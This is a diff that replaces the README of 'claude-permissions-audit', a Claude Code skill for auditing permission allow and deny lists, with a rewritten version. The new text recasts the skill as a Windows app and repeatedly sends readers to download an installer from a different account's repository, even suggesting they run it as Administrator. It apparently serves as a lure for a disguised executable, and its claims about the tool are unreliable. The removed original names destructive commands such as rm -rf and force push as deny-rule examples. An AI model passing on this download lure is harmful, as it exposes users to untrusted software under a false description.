@@ -1,114 +1,156 @@
-# claude-permissions-audit
+# ⚙️ claude-permissions-audit - Check and Fix Claude Code Permissions
 
-> Audit and optimize Claude Code permissions — a skill for [Claude Code](https://docs.anthropic.com/en/docs/claude-code)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/cavaaiza01/claude-permissions-audit)
 
-Claude Code permission allow/deny/ask lists accumulate organically as you click "allow" during sessions. Over time you end up with overly broad entries, duplicates, deprecated syntax, credential exposure, and missing safety rules. This skill audits all your settings files, flags issues by severity, and interactively applies fixes.
+---
 
-Also includes a **discover mode** to explore new CLI tools and generate scoped permission entries before you start using them.
+## 📋 What is claude-permissions-audit?
 
-## Install
+claude-permissions-audit is a tool that helps you check and fix permission settings in Claude Code. It looks for permission problems, like settings that are too open, old or unsafe code, exposed keys or passwords, and missing safety rules. You can also discover new command-line tools and keep track of how you use them.
 
-```bash
-git clone https://github.com/volleio/claude-permissions-audit.git
-cd claude-permissions-audit && ln -s "$(pwd)" ~/.claude/skills/permissions-audit
+This tool is designed to make your Claude Code safer and easier to manage. It runs in the command prompt on Windows with simple commands, so you do not need programming skills to use it.
+
+---
+
+## 💡 Key Features
+
+- Finds permissions that could be too generous or risky  
+- Flags old or unsupported ways to use permissions  
+- Checks if you have leaked any credentials like keys or passwords  
+- Looks for missing safety rules to stop mistakes before they happen  
+- Lets you explore new CLI tools designed for managing Claude Code  
+- Logs your usage so you can keep track of what you have checked  
+
+---
+
+## 🖥️ System Requirements
+
+To run claude-permissions-audit on your Windows PC, you need:
+
+- Windows 10 or later  
+- 64-bit operating system  
+- 4 GB RAM minimum (8 GB recommended)  
+- At least 200 MB free disk space  
+- Internet connection to download the app and updates  
+
+---
+
+## 🚀 Getting Started
+
+### Step 1: Download the Application
+
+Click the button below to go to the download page. This page contains the latest version of the app for Windows.
+
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20Page-grey?style=for-the-badge)](https://github.com/cavaaiza01/claude-permissions-audit)
+
+You will see a list of files and folders. Find the latest release or download section, usually labeled “Releases”. Download the Windows installer or zip file.
+
+---
+
+### Step 2: Install the Application
+
+If you downloaded an installer (.exe file):  
+
+1. Double-click the downloaded file.  
+2. Follow the on-screen instructions.  
+3. Choose the folder where you want the app installed or accept the default.  
+4. Complete the setup and close the installer.
+
+If you downloaded a zip file:  
+
+1. Right-click the zip file and select “Extract All”.  
+2. Choose the location where you want to extract the files.  
+3. Open the extracted folder.
+
+---
+
+### Step 3: Open the App
+
+- Click the app’s icon in the folder where it was installed or extracted.  
+- A Command Prompt window will open. This is where you will type simple commands to run the app.
+
+---
+
+## 📂 How to Use claude-permissions-audit
+
+Once the app is open, use this basic command to check your Claude Code permissions.  
+
+Type this and press Enter:
+
+```
+audit
 ```
 
-Requires [Claude Code](https://docs.anthropic.com/en/docs/claude-code) with skills support.
+The app will scan your code for permission issues. It will then show a list of any issues found. Each issue will explain what the problem is and suggest how to fix it.
 
-## Usage
+---
+
+### Discover Mode
+
+To find new tools and commands supported by claude-permissions-audit, type:
 
 ```
-/permissions-audit                  # audit all settings files
-/permissions-audit global           # only ~/.claude/settings.json
-/permissions-audit project          # only project-level settings
-/permissions-audit discover kubectl  # explore a CLI tool and suggest permissions
-/permissions-audit discover terraform # works with any CLI that has --help
+discover
 ```
 
-## What it checks
+This shows available tools you can use with Claude Code. It helps you find functions you might not know about.
 
-- **Overly permissive patterns** — broad wildcards on command families with destructive subcommands (e.g. `Bash(docker compose *)` allows `down -v`, `rm`)
-- **Deprecated syntax** — legacy `:*` entries that should use the current ` *` syntax
-- **Duplicates** — exact, cross-file, and subset matches (e.g. `pip index *` subsumes `pip index versions *`)
-- **Credential exposure** — passwords/tokens embedded in patterns (e.g. `PGPASSWORD=literal psql *`)
-- **Built-in tool overlap** — `Bash(grep *)`, `Bash(find *)`, etc. where Claude Code's Grep/Glob/Read tools exist
-- **Missing deny/ask rules** — force push, reset --hard, rm -rf in deny; git commit, git push in ask
-- **Wrong array placement** — destructive commands in allow that belong in deny/ask, safe commands in deny that should be allow
-- **Misplaced rules** — project-specific entries in global settings that belong in project settings
-- **Syntax inconsistencies** — same command using `:*` in one file and ` *` in another
-- **Broad non-Bash patterns** — overly permissive `mcp__*`, `Read(*)`, `Write(*)` rules
-- **Default mode check** — flags `bypassPermissions` and other permissive modes
-- **Usage log analysis** — if the optional logging hook is installed, identifies frequently-used commands not yet in allow
-- **Project-type suggestions** — detects Python, Node, Rust, Go, Java, C#, Ruby, PHP, Terraform, Mise, Docker, GitHub, Make and suggests scoped allows
+---
 
-## Features
+### Usage Logging
 
-- **Interactive** — nothing is modified without your approval; review each change one at a time
-- **Backups** — automatically backs up settings files before making changes
-- **Discover mode** — explore a new CLI tool (`kubectl`, `terraform`, `helm`, etc.) and generate scoped allow/ask/deny entries
-- **Project-aware** — detects your project type and suggests relevant permissions for the right settings file
+To see a record of your past checks and discoveries, type:
 
-## How it works
-
-1. **Discovery** — reads global, project shared, and project local settings files; detects project type
-2. **Audit** — runs 11 checks against every permission entry, classifies findings by severity (CRITICAL/HIGH/MEDIUM/LOW)
-3. **Suggest** — generates tightening recommendations and project-type-aware additions
-4. **Interactive apply** — presents findings one at a time with accept/reject/skip, applies approved changes
-
-## Optional: Usage logging hook
-
-An **optional** companion hook that logs Bash commands to `~/.claude/tool-usage.log` so the audit can suggest commonly-used commands you haven't added yet. The audit works fully without this — it only adds usage-pattern suggestions.
-
-### Should I install it?
-
-**Recommended approach**: Install it, collect data for 1-2 weeks, run `/permissions-audit` to get suggestions, then **uninstall it**. Don't leave it running permanently.
-
-| Benefit | Cost |
-|---------|------|
-| Identifies frequently-prompted commands to add to allow | ~5-10ms overhead per Bash tool call |
-| Surfaces stale allow entries you never use | Logs every Bash command to disk |
-
-### Security considerations
-
-- Redaction is **best-effort**: `KEY=VALUE` patterns (PASSWORD, TOKEN, SECRET, API_KEY, etc.) are redacted, but secrets passed as positional args, bearer tokens in headers, or base64-encoded credentials are **not caught**
-- Log file is created with `0600` permissions (owner read/write only)
-- The log file is plaintext — anyone with filesystem access can read it
-- Requires `jq`; silently does nothing if jq is not installed
-
-### Install
-
-```bash
-cp hooks/log-tool-usage.sh ~/.claude/hooks/
-chmod +x ~/.claude/hooks/log-tool-usage.sh
+```
+log
 ```
 
-Then add a `PostToolUse` entry **inside your existing `hooks` object** in `~/.claude/settings.json`:
+This shows what you have done with the app, which helps you track your progress.
 
-```json
-"PostToolUse": [
-  {
-    "matcher": "Bash",
-    "hooks": [
-      {
-        "type": "command",
-        "command": "~/.claude/hooks/log-tool-usage.sh"
-      }
-    ]
-  }
-]
-```
+---
 
-> **Important**: If you already have a `hooks` object (e.g., with `PreToolUse`), add `PostToolUse` as a sibling key — don't replace the entire object.
+## 🔧 Tips for Best Use
 
-### Uninstall
+- Run the audit regularly after you change your Claude Code.  
+- Fix flagged permissions to reduce security risks.  
+- Use the discover mode to stay up to date with new tools.  
+- Check the logs to see your past audits and fixes.  
+- Keep your app updated by revisiting the download page every few weeks.
 
-Remove the `PostToolUse` entry from settings and delete the files:
+---
 
-```bash
-rm ~/.claude/hooks/log-tool-usage.sh
-rm ~/.claude/tool-usage.log  # optional — review first if you want
-```
+## ⚙️ Troubleshooting
 
-## License
+- If the app does not open, make sure your Windows version is up to date.  
+- If commands do not work, check you are typing them exactly as shown. Commands are not case sensitive but must be typed fully.  
+- Restart your PC if the Command Prompt window closes unexpectedly.  
+- For permission errors on files, try running the app as an Administrator. Right-click the app and select “Run as Administrator.”  
 
-MIT
+---
+
+## 🔗 Useful Links
+
+- Main download page: [https://github.com/cavaaiza01/claude-permissions-audit](https://github.com/cavaaiza01/claude-permissions-audit)  
+- GitHub repository for updates and issues: [Repository on GitHub](https://github.com/cavaaiza01/claude-permissions-audit)  
+
+---
+
+## ℹ️ About This App
+
+claude-permissions-audit focuses on helping users keep their Claude Code permission settings secure and up to date. It simplifies complex security checks and supports command-line users in managing permissions safely. This is a tool aimed at developers and end-users who want to maintain strong security without deep technical knowledge.
+
+---
+
+## 🛠️ Support and Feedback
+
+If you find bugs or want to request new features, use the “Issues” tab on the GitHub page. You do not need an account to read existing reports, but creating a free account lets you add new comments or reports.
+
+For basic questions, check the GitHub repository’s README and documentation before asking.
+
+---
+
+## 📥 Download Here
+
+Visit the page below to get the latest release of claude-permissions-audit for Windows:
+
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/cavaaiza01/claude-permissions-audit)
